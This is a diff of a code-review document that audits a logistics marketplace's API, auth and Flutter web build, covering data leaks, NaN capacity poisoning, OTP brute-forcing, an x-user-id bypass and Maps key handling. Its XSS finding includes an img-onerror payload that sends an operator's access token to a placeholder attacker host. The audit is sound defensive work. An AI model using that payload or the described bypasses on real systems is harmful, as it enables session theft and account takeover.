@@ -7,10 +7,12 @@ the defect, a concrete failure scenario, and a specific change. Nothing here is 
 preference — where something is a matter of taste it is marked as such and put at the bottom.
 
 **This pass is documentation only — it changes no behaviour.** Several findings overlap with the
-open draft PRs (#81–#106) that nobody has reviewed; those are noted inline.
+open draft PRs that nobody has reviewed; those are noted inline. There are 71 of them, every one
+still a draft, numbered #2 to #106.
 
-Re-verified against commit `187fe76` (2026-09-13). Test suite: **60/60 passing** (54 API + 6 core)
-on Node 24, run locally.
+Re-verified against commit `f96ccf9` (2026-09-15). Test suite: **60/60 passing** (54 API + 6 core),
+run locally on Node 24.9.0. Node 20 cannot run it at all — `--experimental-strip-types` does not
+exist there, and `npm test` fails before the first test.
 
 **What the 2026-09-13 re-verification changed.** Main advanced 16 commits and ~2,400 lines between
 the first pass (`0fc4ad0`) and this one, adding GitHub Actions CI, a three-environment Render
@@ -18,13 +20,25 @@ promotion pipeline, and an ops soft-delete subsystem. Against that:
 
 | | Findings |
 |---|---|
-| Fixed | **M5** (CI now runs the tests) |
+| Fixed | **M5**'s original finding — the suite now runs in CI on `main`. M5 itself is "Fixed in part": three gaps remain, the first being the missing `pull_request:` trigger |
 | Partially fixed | **H4** (sessions are now revocable, but only by deactivating the account) |
 | Newly introduced | **C5**, **C6**, **C7** — see below |
 | Everything else | Still stands. Line-number citations were re-checked and corrected |
 
 `services.ts` grew 1,936 to 2,277 lines and `httpServer.ts` 1,602 to 1,695, so every line citation
-in the first pass had moved. They have all been re-read and re-cited against `187fe76`.
+in the first pass had moved. That pass claimed all of them had been re-cited. The 2026-09-15 pass
+below found roughly twenty that had not been, so treat any citation not carrying a 2026-09-15
+marker as worth re-checking before you act on it.
+
+**What the 2026-09-15 re-check changed.** Main advanced one commit, `f96ccf9` ("fix: load maps API
+key at runtime for Flutter web", 2026-09-14), touching five files and no API source.
+`git diff --stat 187fe76 f96ccf9` confirms nothing C0 through C6 cites moved. It closes the
+container half of **C7** and opens a new half on the static-site build path. How much that second
+half matters depends on a fact this repository cannot answer: `render.yaml` now declares nine
+services and all nine are `runtime: image`, so the static path is no longer in the blueprint, but
+the blueprint's own header says the pre-existing production static services still exist and have
+not been cut over. Whether they still build from `scripts/render-build-customer-web.sh` is a
+Render dashboard question, not a git one.
 
 ---
 
@@ -60,7 +74,7 @@ the **whole** `AnchorTrip`. And `AnchorTrip` carries `lastLiveLocation?: TripLiv
 ```
 
 The route is not an oversight of the demo-surface gate — it is *deliberately* public.
-`publicMarketplaceRouteAllowed` (`httpServer.ts:297`) allowlists it by name so the customer
+`publicMarketplaceRouteAllowed` (`httpServer.ts:299`) allowlists it by name at `:300` so the customer
 marketplace keeps working in production.
 
 **Failure scenario:** anyone on the internet polls `GET https://navig8r.onrender.com/anchor-trips`
@@ -105,7 +119,7 @@ Then `services.ts:1580` runs `trip.reservedKg += NaN` and the trip is poisoned f
 - Every later booking passes the capacity guard too, since `NaN + n > capacity` is also `false`.
 - The payment is created with `amountPaise: NaN`.
 - **It cannot be repaired.** Both release paths use `Math.max(0, trip.reservedKg - s.weightKg)`
-  (`:1678`, `:1792`), and `Math.max(0, NaN)` is `NaN`. There is no admin endpoint that sets
+  (`:2019`, `:2133`), and `Math.max(0, NaN)` is `NaN`. There is no admin endpoint that sets
   `reservedKg` directly.
 
 *Verified by running the comparisons in Node 24 against the guards as written; the guard lines
@@ -137,7 +151,8 @@ final r = await api.post(".../v1/auth/otp/verify",
 ```
 
 Server-side, `pilotOtpVerify` compares the submitted code against **that new challenge's** code
-(`auth.ts:135`). With real random codes the two can never match, so customer login always fails.
+(`auth.ts:120`, compared at `:138`). With real random codes the two can never match, so customer login
+always fails.
 
 It works today only because `OTP_DEBUG=1` makes every challenge return the same fixed code
 (`OTP_FIXED_CODE ?? "123456"`, `auth.ts:99`).
@@ -173,9 +188,9 @@ writes the carrier's ledger line, and marks the shipment `DELIVERED`** in one ca
 
 Two things combine to make this reachable in production:
 
-**1. The demo-surface gate never fires for it.** `requireLegacyDemoSurface` (`:317`) calls
+**1. The demo-surface gate never fires for it.** `requireLegacyDemoSurface` (`:319`) calls
 `publicMarketplaceRouteAllowed` first and returns `true` immediately if it matches. That function
-explicitly allowlists both routes (`:308-309`):
+explicitly allowlists both routes (`:310-311`):
 
 ```
 if (method === "POST" && segs.length === 3 && segs[0] === "shipments" && segs[2] === "pod") return true;
@@ -208,7 +223,8 @@ The one thing that *is* handled: with no bearer token at all, both routes 401 in
 Unauthenticated abuse is blocked; authenticated abuse by the two parties with the most financial
 motive is not.
 
-Note `markPodDelivered` refuses when the status is already `PENDING_RELEASE` (`:1660`), so this
+Note `markPodDelivered` (`services.ts:1992`) refuses when the status is already
+`PENDING_RELEASE` (`:2001`), so this
 only works *before* a driver submits POD normally — which is exactly when a carrier would use it.
 
 Related to **open draft PR #82** ("DRIVER payout hijack, POD-before-start").
@@ -303,8 +319,8 @@ ordering is not guaranteed. The payment flips back to `CAPTURED` while the shipm
 
 `services.ts:1580` reserves capacity the moment `bookShipment` runs — before the carrier
 accepts and before payment is authorized. `reservedKg` is decremented in exactly two places:
-`rollbackBooking` (`:1678`, only when Razorpay order creation fails) and `failCarrierAndRefund`
-(`:1792`). There is no expiry, no timeout, and no sweeper for a shipment left in
+`rollbackBooking` (`:2014`, releasing at `:2019`, only when Razorpay order creation fails) and
+`failCarrierAndRefund` (`:2104`, releasing at `:2133`). There is no expiry, no timeout, and no sweeper for a shipment left in
 `PENDING_CARRIER_ACCEPT`.
 
 **Failure scenario:** a customer starts a booking and abandons checkout. The capacity is gone
@@ -325,7 +341,7 @@ Three separate production protections are keyed off `NODE_ENV !== "production"`:
 | File:line | What it guards | Behaviour when `NODE_ENV` is not exactly `production` |
 |---|---|---|
 | `httpServer.ts:321` | The legacy demo surface | Enabled |
-| `httpServer.ts:92` | CORS origin allowlist | Reflects **any** origin |
+| `httpServer.ts:92` | CORS origin allowlist | Reflects **any** origin, but only if `CORS_ALLOWED_ORIGINS` is unset or blank — `:84-89` returns first when it is set, and `render.yaml` sets it on alpha (`:72-73`) and beta (`:151-152`) |
 | `integrationServices.ts:98` | Partner webhook URL scheme | Plain `http://` accepted |
 
 `render.yaml` now sets `NODE_ENV` to the **environment name**:
@@ -336,7 +352,10 @@ Three separate production protections are keyed off `NODE_ENV !== "production"`:
 - name: production   NODE_ENV: production  (key absent)
 ```
 
-So on alpha **and beta**, all three protections are off. Beta's `ENABLE_LEGACY_DEMO_SURFACE: "0"` is
+So on alpha **and beta**, two of the three protections are off: the demo surface and the webhook URL
+scheme. CORS is not — `render.yaml` sets `CORS_ALLOWED_ORIGINS` to a single explicit origin on alpha
+(`:73`) and beta (`:152`), and `resolveCorsOrigin` returns from that allowlist at `httpServer.ts:83-89`
+before it ever reaches line 92. Beta's `ENABLE_LEGACY_DEMO_SURFACE: "0"` is
 inert — line 321 short-circuits on the `NODE_ENV` test before it is ever read:
 
 ```ts
@@ -350,8 +369,8 @@ What that opens on beta, all unauthenticated (verified by reading each handler):
 | `GET /v1/users` | 896 | `[...store.users.values()]` — every user and phone number |
 | `GET /v1/orgs` | 890 | Every organisation |
 | `GET /admin` | 902 | An HTML page rendering users, memberships, vehicles, trips, shipments, payments and ledger lines |
-| `POST /carriers`, `POST /anchor-trips` | 1355, 1369 | Legacy CRUD — publish capacity as any carrier |
-| `POST /v1/pilot/driver/login` | 553 | Legacy driver login with no OTP |
+| `POST /carriers`, `POST /anchor-trips` | 1356, 1370 | Legacy CRUD — publish capacity as any carrier |
+| `POST /v1/pilot/driver/login` | 554 | Legacy driver login with no OTP |
 
 Beta is the UAT environment. It runs `PAYMENT_PROVIDER=RAZORPAY` against real Razorpay test
 credentials, and it is the environment real pilot users get pointed at.
@@ -374,17 +393,21 @@ Then set `ENABLE_LEGACY_DEMO_SURFACE: "1"` on alpha only, and give CORS and the 
 their own named variables. Deleting the legacy routes outright is better still — see R3.
 
 Draft PR **#104** ("Honor ENABLE_LEGACY_DEMO_SURFACE=0 on beta") fixes the demo-surface third of this.
-It does not touch CORS or the webhook scheme check, both of which are open on beta for the same reason.
+It does not touch the webhook scheme check, which is open on beta for the same reason. CORS is not
+open on beta — `CORS_ALLOWED_ORIGINS` is set there, so the allowlist branch returns first and
+`httpServer.ts:92` is never reached.
 
 ### C6. Ops soft-delete does not reach the marketplace: tombstoned trips are still listed and bookable
 
 `opsDeleteUser` cascades a tombstone across organisations, shipments, payments, trips, ledger lines,
 vehicles and driver profiles (`services.ts:619` onward). It is careful work. But `isActiveEntity` is
-called in only three places outside the deletion path itself:
+called in only two areas outside the deletion path itself — login and session verification, and
+ops-admin resolution:
 
 ```
 auth.ts:93, 127, 165     login and session verification
-services.ts:353, 389     customer shipment visibility
+services.ts:353, 357     isOpsAdmin
+services.ts:389, 391     listOpsAdmins
 ```
 
 It is called **nowhere** in listing, quoting, or booking. Verified:
@@ -416,67 +439,100 @@ Related: the public listing also spreads the whole trip object, so it now public
 `inactiveAtUtcMs` and `inactiveReason: "ops_user_deactivate"` — that an account was deactivated by ops,
 and when. See C0.
 
-### C7. The containerised customer-web silently loses the Maps API key, breaking address entry
+### C7. The Maps API key now reaches the container build and no longer reaches the static build
 
-Two different mechanisms carry `MAPS_API_KEY` into the Flutter web app, and the new container build
-uses only one of them.
-
-| Consumer | How it gets the key | Container build |
-|---|---|---|
-| Google Maps JS `<script>` in `web/index.html:24` | `__MAPS_API_KEY__` placeholder, `sed`-replaced at container start by `docker/customer-web/entrypoint.sh:12` | Works |
-| Dart `kMapsApiKey` (`maps_config.dart:7`) | `String.fromEnvironment("MAPS_API_KEY")` — resolved at **compile** time | **Empty string** |
-
-`Dockerfile.customer-web:31-33` builds with one define:
-
-```dockerfile
-RUN flutter pub get \
-    && flutter build web --release \
-       --dart-define=API_BASE_URL=/api
-```
-
-The existing static Render build does pass it (`scripts/render-build-customer-web.sh:44-48`):
-
-```bash
-DART_DEFINES=(--dart-define="API_BASE_URL=$API_BASE_URL")
-if [ -n "$MAPS_API_KEY" ]; then
-  DART_DEFINES+=(--dart-define="MAPS_API_KEY=$MAPS_API_KEY")
-fi
-```
-
-So this is a **regression that arrives at cutover**, not a bug that is live today. `render.yaml` names
-`navig8r-customer-web-image` as the production migration target; the day that replaces the static
-service, Dart-side geocoding stops.
-
-And it stops **silently**, because both call sites early-return on an empty key:
+`f96ccf9` ("fix: load maps API key at runtime for Flutter web") moved the Dart-side key from a
+compile-time constant to a runtime lookup. `maps_config.dart:7-8` is now a conditional export:
 
 ```dart
-// location_editor.dart:413 and driver_flow.dart:1609
+export "maps_config_native.dart"
+    if (dart.library.html) "maps_config_web.dart";
+```
+
+Native builds keep `String.fromEnvironment("MAPS_API_KEY", defaultValue: "")`
+(`maps_config_native.dart:5-8`), so the Android path is unchanged. Web builds now resolve
+`kMapsApiKey` by reading `window.__NAVI8R_CONFIG__.MAPS_API_KEY` (`maps_config_web.dart:4-24`) and
+**ignore `--dart-define=MAPS_API_KEY` entirely.**
+
+**Closed — the container.** `docker/customer-web/entrypoint.sh:16-20` writes that object at container
+start, beside the `sed` that fills the script tag:
+
+```sh
+cat > /usr/share/nginx/html/runtime-config.js <<EOF
+window.__NAVI8R_CONFIG__ = {
+  MAPS_API_KEY: "${MAPS_API_KEY}"
+};
+EOF
+```
+
+`web/index.html:22` loads it ahead of the Maps script tag at `:26`. The image build never runs
+`inject-maps-api-key.sh` — `Dockerfile.customer-web:22` is `COPY . .` and `:29-31` go straight to
+`flutter build web` — so the committed `index.html` reaches `build/web` with its `runtime-config.js`
+tag intact. Both consumers now read one runtime value and no key is baked into the image. Building
+with only `--dart-define=API_BASE_URL=/api` is now correct rather than a gap.
+
+**Open on the static build path — whether that path is still serving production is a dashboard
+question.** If production customer web is still the static Render site, this is live today; if the
+`-image` service has been cut over, it is not. The repository cannot settle it. `render.yaml:20-23`
+says only that the existing static services cannot be converted in place and that the
+migration-named services "should be cut over only after they have been validated" — an instruction,
+not a status — and the production entry `navig8r-customer-web-image` at `render.yaml:251` is a
+declaration, not an observation. Either way, three things on the static path were not updated with
+the rest:
+
+| What | Where | State |
+|---|---|---|
+| `--dart-define=MAPS_API_KEY` is still passed | `scripts/render-build-customer-web.sh:42-45` | Dead for web — `maps_config_web.dart` does not read it |
+| Nothing writes `runtime-config.js` into `build/web` | `scripts/render-build-customer-web.sh` (49 lines) | Missing |
+| The `<script src="runtime-config.js">` tag is removed before the build | `scripts/inject-maps-api-key.sh:29` — `cp "$TEMPLATE" "$INDEX"`, called from `render-build-customer-web.sh:37` | `web/index.template.html` never got the tag, and the copy overwrites `index.html` |
+
+So wherever that build path runs, `window.__NAVI8R_CONFIG__` is undefined and `kMapsApiKey` returns
+`""`, which switches Dart-side geocoding off. Whether a live site is serving that build was not
+checked, and cannot be from the repository. A local `flutter run -d chrome` is off for the same reason by a
+different route: no `runtime-config.js` file exists under `apps/driver_pilot/web/`, and the local
+recipe in `docs/RENDER.md:120` is `bash scripts/inject-maps-api-key.sh`, which strips the tag as
+well. **The direction of this finding has reversed:** the container path was the broken one and is
+now correct; the static path was correct and is now broken.
+
+*Scope of verification:* the files above were read at `f96ccf9`. I did **not** run a Flutter web
+build or load the deployed site, so this rests on Dart's conditional-export semantics
+(`dart.library.html` is true for the web target) rather than on an observed build.
+
+Three of the four readers of `kMapsApiKey` fail **silently**. Reverse geocoding after a pin drag
+(`location_editor.dart:413`) and trip-city geocoding (`driver_flow.dart:1609`) both early-return,
+and `reverseLatLng` (`google_geocoding.dart:73`) returns `null` on the same condition — though its
+only caller, `location_editor.dart:416`, already sits behind the guard at `:413`:
+
+```dart
 if (kMapsApiKey.isEmpty) return;
 ```
 
-**Failure scenario:** the cutover happens. Map tiles still render, because the script tag got its key
-from the entrypoint. Address autocomplete and reverse geocoding do nothing at all — no error, no
-console warning, no fallback. A customer cannot enter a pickup address, so no one can book. It looks
-like a UI bug rather than a build-arg omission, which is the expensive kind.
+The Look up button is not silent. `location_editor.dart:382` calls `forwardAddress` with no guard,
+`google_geocoding.dart:35-36` returns `GeocodeOutcome.fail("NO_API_KEY", ...)`, and
+`location_editor.dart:386-392` renders a hint line plus a snackbar reading "Add
+--dart-define=MAPS_API_KEY=… when running Flutter (same key as android/local.properties)."
+(`showApiKeyHint` defaults to `true` at `:337` and is never overridden.) That advice is now wrong on
+web, because `maps_config_web.dart` does not read `--dart-define` at all.
 
-**Fix:** add the build arg to `Dockerfile.customer-web`:
+**Failure scenario:** a customer opens the booking screen on the live static site —
+`customer_flow.dart` builds `LocationEndpointEditor` at `:1345`, `:1355`, `:1676` and `:1686`. Map
+tiles render, because the script tag got its key from `inject-maps-api-key.sh`. Typing an address and
+pressing Look up fails with a developer-facing message about a Flutter build flag. Dragging the pin
+still records a position — `location_editor.dart:411` calls `widget.onPositionChanged(p)` before the
+guard on the next line — but the address label is never filled in, with no error. It reads as a UI
+bug rather than a config gap, which is the expensive kind.
 
-```dockerfile
-ARG MAPS_API_KEY=""
-RUN flutter build web --release \
-      --dart-define=API_BASE_URL=/api \
-      --dart-define=MAPS_API_KEY="${MAPS_API_KEY}"
-```
-
-then pass it from `release.yml`. Note this bakes the key into the image, which the runtime-`sed`
-approach deliberately avoided — so the better fix is to stop reading the key from a compile-time
-constant and read it from `release.json` (which the entrypoint already writes) or from a `<meta>` tag
-the entrypoint fills, keeping one runtime injection point for both consumers.
+**Fix:** make the static build produce the same runtime object the container does. Add
+`<script src="runtime-config.js"></script>` to `apps/driver_pilot/web/index.template.html` so
+`inject-maps-api-key.sh` stops removing it; have `render-build-customer-web.sh` write
+`build/web/runtime-config.js` from `$MAPS_API_KEY` after `flutter build web`; and drop the now-dead
+`--dart-define=MAPS_API_KEY` from that script so nothing suggests the compile-time path still works.
+The `NO_API_KEY` snackbar text needs updating too — it names a flag the web build ignores.
 
 Either way, **replace the two silent `return`s with a visible error**. A missing key should be loud.
 
 Draft PR **#97** ("Clarify MAPS_API_KEY APK build + customer GPS root causes") is adjacent but is about
-the APK build, not the container.
+the APK build, which `maps_config_native.dart` leaves working exactly as before.
 
 ## High — security
 
@@ -484,14 +540,14 @@ the APK build, not the container.
 
 `httpServer.ts:285-292`. When `ALLOW_X_USER_ID=1`, `requireUserId` returns the `x-user-id`
 header directly — no signature, no session lookup, no expiry check — before it ever considers
-the bearer token. It fronts roughly 20 authenticated routes.
+the bearer token. It fronts 23 `requireUserId` call sites — 22 individual routes plus one prefix guard on `/v1/pilot/customer/integrations` (`httpServer.ts:873-875`) that covers the seven integration-portal routes in `integrationHttp.ts`, so 29 authenticated routes in total.
 
 The sharp edge is an inconsistency right next to it. There are **two** identity helpers:
 
 | Helper | Honors the bypass? | Used by |
 |---|---|---|
-| `requireBearerUserId` (`:326`) | No — goes straight to `verifyBearer` | `/ops/shipments/*`, `/ops/.../release` |
-| `requireUserId` (`:283`) | **Yes** | `POST /payout-batches/run`, `GET /payout-batches`, and the pilot routes |
+| `requireBearerUserId` (`:328`) | No — goes straight to `verifyBearer` | `/ops/shipments/*`, `/ops/.../release` |
+| `requireUserId` (`:285`) | **Yes** | `POST /payout-batches/run`, `GET /payout-batches`, and the pilot routes |
 
 So the ops *release* endpoints are protected from the bypass, but `POST /payout-batches/run` —
 the endpoint that moves real money under `PAYOUTS_MODE=RAZORPAYX` — is not.
@@ -513,7 +569,7 @@ return "<tr><td><code>" + s.id + "</code></td><td>" + (s.customerOrgName||"") + 
 ```
 
 `customerOrgName` is supplied by the customer at booking. The `/admin` route defines a local
-`esc()` helper (`:861-866`); the ops portal defines nothing.
+`esc()` helper (`:915-920`); the ops portal defines nothing.
 
 **Failure scenario:** a customer registers an org named
 `<img src=x onerror="fetch('//attacker/'+localStorage.access_token)">`. An operator opens
@@ -534,15 +590,20 @@ and apply it to every interpolated field.
 
 `auth.ts`. `pilotOtpVerify` compares the submitted code and throws on mismatch, leaving the
 challenge `PENDING`. There is no attempt counter, no lockout, and no per-phone throttle on
-`pilotOtpStart`. The only rate limiting anywhere in the codebase is webhook retry backoff.
+`pilotOtpStart`. No API route is rate limited. The two server-side throttles both sit in the ERP
+integration: retry backoff between webhook delivery attempts (`WEBHOOK_RETRY_MS`,
+`integrationWebhooks.ts:11`) and a five-minute per-shipment throttle on emitting
+`load.location_updated` events (`LOCATION_EVENT_THROTTLE_MS`, `integrationWebhooks.ts:13`, applied
+at `:198-202`). Neither goes anywhere near an authentication route.
 
 A six-digit code with a ten-minute window and unlimited attempts is brute-forceable.
 
 Compounding this, no SMS provider is integrated. `types.ts:91` says so: *"Pilot OTP challenge
 (mock SMS). Replace with real SMS + rate limits in production."* With `OTP_DEBUG=0`, which
-`render.yaml` sets, codes are generated and never delivered — nobody can log in. With
-`OTP_DEBUG=1`, `/v1/auth/otp/start` returns the code to any unauthenticated caller who knows a
-phone number, which is account takeover by design.
+`render.yaml` sets on beta (`:141-142`) and production (`:227-228`), codes are generated and never
+delivered — nobody can log in. With `OTP_DEBUG=1`, which `render.yaml` sets on alpha (`:62-63`),
+`/v1/auth/otp/start` returns the code to any unauthenticated caller who knows a phone number,
+which is account takeover by design.
 
 **This is the single thing blocking a real pilot.** Neither setting supports onboarding a user.
 
@@ -553,7 +614,7 @@ DLT-registered transactional SMS), add a failed-attempt counter that expires the
 ### H4. Sessions are revocable only by deactivating the whole account, and there is still no logout
 
 **Changed since the first pass.** The first pass said nothing ever sets `revokedAtUtcMs`. That is no
-longer true — the ops soft-delete added the one and only writer (`services.ts:714`):
+longer true — the ops soft-delete added the one and only writer (`services.ts:715`):
 
 ```ts
 // Revoke sessions (cannot sign in); expire pending OTPs
@@ -619,7 +680,7 @@ rather than after.
 
 ### H7. Anonymous shipments are visible to anyone who registers a matching organization name
 
-`services.ts:311-316`. Shipment ownership falls back to a **free-text name comparison** when no
+`services.ts:312-317`. Shipment ownership falls back to a **free-text name comparison** when no
 org id is set:
 
 ```
@@ -635,9 +696,9 @@ export function shipmentBelongsToCustomerOrg(shipment: Shipment, org: Organizati
 only when the booking carried a valid bearer token, so every anonymous booking is matched by
 name alone.
 
-Nothing prevents duplicate organization names. `registerCustomerOrgAdmin` (`:500`) rejects a
-duplicate *phone* but never checks `displayName`, and `schema.prisma` declares no `@unique` on
-it.
+Nothing prevents duplicate organization names. `registerCustomerOrgAdmin` (`:787`) rejects a
+duplicate *phone* (`:796-797`) but never checks `displayName`, and `schema.prisma` declares no
+`@unique` on it.
 
 **Failure scenario:** an attacker registers a customer org with `displayName` set to a target
 company's exact name. `GET /shipments` then returns that company's anonymous bookings —
@@ -743,12 +804,15 @@ deciding before anyone raises the Render instance count.
 ### S5. Every domain query is a full scan, and the Prisma schema has no indexes
 
 Lookups such as `findUserByPhone` (`auth.ts:75`) and `findActiveKey`
-(`integrationAuth.ts:39-47`) iterate the entire collection on every request — the latter also
-computing a SHA-256 per key. `schema.prisma` declares no `@@index` and no `@unique` beyond
+(`integrationAuth.ts:39-48`) iterate the entire collection on every request. `findActiveKey`
+computes one SHA-256 per request, hoisted above the loop (`integrationAuth.ts:40`), then does a
+string comparison of that hash against each key that matches the key ID and is `ACTIVE`
+(`integrationAuth.ts:42-43`). `schema.prisma` declares no `@@index` and no `@unique` beyond
 primary keys.
 
 At pilot scale this costs nothing and needs no action. It is recorded because the fix is cheap
-once volume arrives, and because the missing `@unique` on `User.phone` is a correctness gap as
+once volume arrives, and because the missing `@unique` on `UserRow.phone` (`schema.prisma:35`)
+is a correctness gap as
 much as a performance one — nothing at the database level stops two users sharing a phone
 number.
 
@@ -773,10 +837,13 @@ anonymous only when no header was sent.
 ### M2. Trip capacity uses floating-point equality to detect FULL
 
 `services.ts:1581`: `if (trip.reservedKg === trip.capacityKg) trip.status = "FULL";`
-`weightKg` is validated only as `> 0` (`:1211`), so fractional weights are accepted and
+`weightKg` is validated only as `> 0` (`:1552`), so fractional weights are accepted and
 `reservedKg` accumulates floating-point error.
 
-The release path at `:1679` correctly uses `<`. Only the FULL transition uses `===`.
+There are two release paths and neither compares capacity with `===`. `rollbackBooking` (`:2014`)
+resets the status with a correct `<` comparison (`:2020`). `failCarrierAndRefund` (`:2104`) resets
+it with no capacity comparison at all — `if (trip.status === "FULL") trip.status = "OPEN";`
+(`:2134`). Only the FULL transition at `:1581` tests capacity for equality.
 
 **Failure scenario:** a 1,000 kg trip books ten 33.3 kg parcels and the rest in fractions.
 `reservedKg` lands on 999.9999999999999. The trip never flips to `FULL` and keeps appearing in
@@ -786,18 +853,32 @@ fails with `insufficient_capacity` instead of the trip being hidden.
 **Fix:** `>=` instead of `===`. Better, store weight in integer grams, matching the decision
 already taken for money.
 
-### M3. Webhook tracking URLs point at a hostname that is not the live portal
+### M3. `CUSTOMER_WEB_BASE_URL` is not set per environment in the blueprint
 
-`integrationWebhooks.ts:70` defaults `CUSTOMER_WEB_BASE_URL` to
-`https://navig8r-customer-web.onrender.com`. The marketing site links the portal at
-`https://navig8r-customer.onrender.com` (`apps/www/src/main.js:1`), and PR #92 —
-"Fix Explore CTA URL (drop -web)" — deliberately moved it there. `CUSTOMER_WEB_BASE_URL` is not
-set in `render.yaml`, so the default is what partners receive.
+**The original finding is fixed.** It claimed `integrationWebhooks.ts:70` defaulted to
+`https://navig8r-customer-web.onrender.com`. It no longer does — commit `dca5c02`
+(2026-09-10, "Fix customer web hostname to navig8r-customer.onrender.com") changed it, and that
+commit is an ancestor of `187fe76`, so the claim was already stale at the last re-verification.
+The line now reads:
 
-There are three hostnames in the tree for two services.
+```ts
+return (process.env.CUSTOMER_WEB_BASE_URL ?? "https://navig8r-customer.onrender.com").replace(/\/$/, "");
+```
 
-**Fix:** set `CUSTOMER_WEB_BASE_URL` in `render.yaml` and confirm which host actually serves the
-portal.
+That matches the portal hostname the marketing site falls back to (`apps/www/src/main.js:10`).
+
+**What still stands.** `CUSTOMER_WEB_BASE_URL` appears nowhere in `render.yaml`, and
+`render.yaml` defines no service named `navig8r-customer`. The three customer-web services are
+`navig8r-customer-web-alpha` (`render.yaml:84`), `navig8r-customer-web-beta` (`:163`) and
+`navig8r-customer-web-image` (`:251`), each given its own `PORTAL_URL` (`:112`, `:191`, `:282`).
+`docs/RENDER.md:137` instead tells the operator to set
+`CUSTOMER_WEB_BASE_URL=https://navig8r-customer.onrender.com` by hand on the API service after
+deploying, so whether alpha and beta emit the hardcoded default or a dashboard value cannot be
+determined from the repository.
+
+**Fix:** set `CUSTOMER_WEB_BASE_URL` per environment in `render.yaml`, matching that
+environment's `PORTAL_URL`, so partner tracking links do not depend on an undocumented manual
+dashboard step.
 
 ### M4. Nothing typechecks the codebase
 
@@ -846,7 +927,7 @@ on:
 
 There is no `pull_request:` trigger, so tests never run on a PR. They run on `main` **after** the
 merge. The pipeline then refuses to deploy, which is the right outcome but the wrong moment: `main`
-is left red, and with 40+ open draft PRs and no required status check, the person who merged has
+is left red, and with 71 open draft PRs and no required status check, the person who merged has
 already moved on.
 
 Adding four lines fixes it:
@@ -863,7 +944,8 @@ Then make `Repository Tests` a required status check in branch protection. Witho
 protection rule the trigger alone is advisory.
 
 **2. Nothing runs Flutter.** No workflow installs Flutter, so `flutter analyze` and `flutter test`
-have never run in CI. The Dart code is roughly 7,100 lines across 13 files and is checked by nobody.
+have never run in CI. The Dart code is 7,160 lines across 19 files in `apps/driver_pilot/lib/` and is
+checked by nobody.
 `Dockerfile.customer-web` does run `flutter build web`, so a **compile** error would fail the release
 — but an analyzer warning, a failing widget test, or the `mounted` bugs in M11 would not.
 
@@ -872,19 +954,29 @@ have never run in CI. The Dart code is roughly 7,100 lines across 13 files and i
 What CI still cannot catch, by design: anything behind `PERSISTENCE=DB` (no Postgres service in the
 workflow), and the marketing site (no tests exist for it).
 
-### M6. Node 22+ is mandatory and nothing says so
+### M6. Node 22+ is mandatory and nothing machine-readable says so
 
 `--experimental-strip-types` does not exist before Node 22.6. On Node 20 — still a widely
 installed LTS — the API fails with `node: bad option: --experimental-strip-types` and no hint.
-There is no `engines` field and no `.nvmrc`.
+
+The prose gap is closed: `README.md:142` and `docs/CODEBASE_MAP.md:108` both state the
+requirement. What is still missing is anything a tool can read — no `engines` field in any of
+the four `package.json` files (root, `apps/api`, `apps/www`, `packages/core`) and no `.nvmrc`.
 
 **Fix:** add `"engines": { "node": ">=22.6" }` to the root `package.json` and a `.nvmrc`
 containing `22`.
 
-### M7. No `.env.example`, for roughly 25 load-bearing variables
+### M7. No `.env.example`, for 29 load-bearing API variables
 
-The only record of what must be configured is scattered across `render.yaml` comments and prose
-docs. A new contributor cannot start the API without reading several files.
+`grep -rhoE 'process\.env\.[A-Za-z_][A-Za-z0-9_]*' apps packages | sort -u` returns 27 distinct
+names, and `apps/api/src/config.ts:32` builds two more at runtime from the vehicle class
+(`FREIGHT_PAISE_PER_KM_MEDIUM` and `_LARGE`). Five further variables are consumed outside the API
+process: `MAPS_API_KEY`, `API_BASE_URL`, `API_UPSTREAM`, `PORTAL_URL` and
+`VITE_TURNSTILE_SITE_KEY`.
+
+Nothing in the repo is a `.env.example` —
+`git ls-files | grep -icE 'env\.(example|sample|template)'` returns 0, and no `.env*` file exists
+on disk. A new contributor cannot start the API without reading several files.
 
 **Fix:** commit a `.env.example` listing every variable with a safe placeholder and a one-line
 comment. The table in the README is a ready-made source.
@@ -893,12 +985,35 @@ comment. The table in the README is a ready-made source.
 
 `scripts/inject-maps-api-key.sh` rewrites `apps/driver_pilot/web/index.html` from
 `index.template.html`, substituting the real `MAPS_API_KEY`. Both files are tracked, and
-`.gitignore` excludes neither. They are currently identical, so no key is committed today.
+`.gitignore` excludes neither. They are no longer identical: commit `f96ccf9` added two lines to
+`index.html` (`:21-22`) that the template does not have, so
+`diff apps/driver_pilot/web/index.template.html apps/driver_pilot/web/index.html` now reports
+`20a21,22`. Neither file holds a real key — both still carry the `__MAPS_API_KEY__` placeholder
+(`index.html:26`, `index.template.html:24`) — so no key is committed today.
 
 **Failure scenario:** a developer runs the script locally to test Maps, then commits. A Google
 Maps API key enters git history.
 
-**Fix:** add `apps/driver_pilot/web/index.html` to `.gitignore` and remove it from tracking.
+**Second failure scenario, new since `f96ccf9`.** The script's first action is
+`cp "$TEMPLATE" "$INDEX"` (`scripts/inject-maps-api-key.sh:29`), and `index.template.html` has no
+`runtime-config.js` line. Running the script therefore deletes the
+`<script src="runtime-config.js"></script>` tag that `f96ccf9` added at `index.html:22`. That tag
+is the only thing that defines `window.__NAVI8R_CONFIG__`, and `maps_config_web.dart:4-24` reads
+the key from nowhere else, returning `""` on a missing property or any exception.
+`Dockerfile.customer-web` builds from the committed `web/index.html` (`COPY . .` at line 22,
+`flutter build web` at line 30) and never runs the inject script. So if a developer runs the
+script and commits the result, the container still writes `runtime-config.js`
+(`docker/customer-web/entrypoint.sh:16-20`) but nothing loads it: `kMapsApiKey` is empty on web,
+and geocoding and place search stop working. `scripts/render-build-customer-web.sh:37` runs the
+script on every static Render build, and `docs/RENDER.md:120` and `docs/RENDER.md:182` tell
+developers to run it locally. Nothing fails the build. The only visible sign is the now-misleading
+`"Set MAPS_API_KEY (--dart-define) for look up."` from `google_geocoding.dart:36`; the other three
+call sites (`location_editor.dart:413`, `driver_flow.dart:1609`, `google_geocoding.dart:73`) fail
+silently.
+
+**Fix:** add the `runtime-config.js` tag to `index.template.html` **first** — otherwise both the
+script and the `.gitignore` change below drop it — then add `apps/driver_pilot/web/index.html` to
+`.gitignore` and remove it from tracking.
 
 ### M9. Generated Flutter files are tracked
 
@@ -920,8 +1035,12 @@ before anyone builds a browser-based partner console.
 ### M11. `main.dart` calls `setState` after `await` without `mounted` guards
 
 `main.dart` has 50 `setState` calls and 7 `mounted` checks against 16 awaits. `LoginScreen`
-alone does it at lines 482, 491, 493, 517, 522 and 527. `driver_flow.dart` (54 guards) and
